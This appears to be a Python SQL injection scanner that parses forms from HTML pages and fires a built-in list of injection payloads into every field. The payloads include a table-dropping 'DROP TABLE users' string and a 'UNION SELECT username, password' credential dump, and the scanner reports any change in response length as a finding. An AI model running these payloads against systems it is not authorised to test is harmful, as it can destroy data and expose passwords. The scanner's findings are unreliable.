import time
import warnings
import argparse
import requests
from urllib.parse import urlparse, urljoin, urldefrag, quote_plus
from bs4 import BeautifulSoup
from urllib3.exceptions import NotOpenSSLWarning
warnings.filterwarnings('ignore', category=NotOpenSSLWarning)

def get_session():
    """Returns a requests.Session object for making HTTP requests."""
    return requests.Session()

def is_same_domain(base_url, url):
    """Checks if a given URL is on the same domain as the base URL."""
    try:
        return urlparse(base_url).netloc == urlparse(url).netloc
    except ValueError:
        return False

def extract_links(html, page_url):
    """Extracts all absolute links from a given HTML string."""
    links = set()
    soup = BeautifulSoup(html, 'html.parser')
    for a_tag in soup.find_all('a', href=True):
        href = a_tag.get('href')
        absolute_url = urljoin(page_url, href)
        links.add(absolute_url)
    return list(links)

def extract_forms(html, page_url):
    """Extracts all forms from a given HTML string."""
    forms = []
    soup = BeautifulSoup(html, 'html.parser')
    for form_tag in soup.find_all('form'):
        form_info = {
            'method': form_tag.get('method', 'get').lower(),
            'action': urljoin(page_url, form_tag.get('action', '')),
            'inputs': []
        }
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_info = {
                'name': input_tag.get('name'),
                'type': input_tag.get('type'),
                'value': input_tag.get('value')
            }
            form_info['inputs'].append(input_info)
        forms.append(form_info)
    return forms


# Common SQL Injection payloads for testing
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "admin'--",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 10--+",
    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
    "' OR (SELECT COUNT(*) FROM users) > 0--",
    "1' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 0,1) = 'a'--",
]
class SQLiTester:
    """SQL Injection testing class."""
    def __init__(self, session=None):
        self.session = session or get_session()
        self.vulnerabilities = []
    
    def test_form(self, form, url):
        """Test a single form for SQL injection vulnerabilities."""
        print(f"\n[*] Testing form at {url}")
        print(f"    Method: {form['method']}, Action: {form['action']}")
        
        # Prepare baseline data with harmless values
        baseline_data = {}
        for input_field in form['inputs']:
            input_name = input_field['name']
            # Use different values based on input type
            if input_field['type'] in ['hidden', 'text', 'password', 'textarea', 'search']:
                baseline_data[input_name] = 'test'
            elif input_field['type'] in ['number', 'range']:
                baseline_data[input_name] = '1'
            elif input_field['type'] == 'email':
                baseline_data[input_name] = 'test@example.com'
            else:
                baseline_data[input_name] = input_field.get('value', '')
        
        # Get baseline response
        try:
            if form['method'] == 'get':
                baseline_response = self.session.get(form['action'], params=baseline_data, timeout=10)
            else:
                baseline_response = self.session.post(form['action'], data=baseline_data, timeout=10)
        except Exception as e:
            print(f"[!] Failed to get baseline response: {e}")
            return
        
        # Test each input field with each payload
        for input_field in form['inputs']:
            input_name = input_field['name']
            print(f"    Testing input: {input_name}")
            
            for payload in SQLI_PAYLOADS:
                # Create test data with the payload in the current field
                test_data = baseline_data.copy()
                test_data[input_name] = payload
                
                try:
                    if form['method'] == 'get':
                        response = self.session.get(form['action'], params=test_data, timeout=10)
                    else:
                        response = self.session.post(form['action'], data=test_data, timeout=10)
                    
                    # Check for SQL error indicators
                    error_indicators = [
                        "sql", "syntax", "mysql", "ora-", "postgresql", 
                        "microsoft odbc", "odbc driver", "database error"
                    ]
                    
                    # Check if any error indicators are in the response
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text:
                            vulnerability = {
                                'url': url,
                                'form_action': form['action'],
                                'input_field': input_name,
                                'payload': payload,
                                'evidence': f"Found '{indicator}' in response"
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"[!] Potential SQLi vulnerability found in {input_name} with payload: {payload}")
                            break
                    
                    # Check for differences in response length/content
                    if len(response.text) != len(baseline_response.text):
                        vulnerability = {
                            'url': url,
                            'form_action': form['action'],
                            'input_field': input_name,
                            'payload': payload,
                            'evidence': "Response length differs from baseline"
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"[!] Potential SQLi vulnerability found in {input_name} with payload: {payload}")
                
                except Exception as e:
                    print(f"[!] Error testing payload {payload} on {input_name}: {e}")
                
                # Be polite with a small delay between requests
                time.sleep(0.1)
    
    def generate_report(self):
        """Generate a report of found vulnerabilities."""
        if not self.vulnerabilities:
            print("\n[*] No SQL injection vulnerabilities found.")
            return
        
        print("\n" + "="*80)
        print("SQL INJECTION VULNERABILITY REPORT")
        print("="*80)
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{i}. Vulnerability Found:")
            print(f"   URL: {vuln['url']}")
            print(f"   Form Action: {vuln['form_action']}")
            print(f"   Vulnerable Field: {vuln['input_field']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Evidence: {vuln['evidence']}")
        
        print(f"\nTotal vulnerabilities found: {len(self.vulnerabilities)}")
        print("="*80)
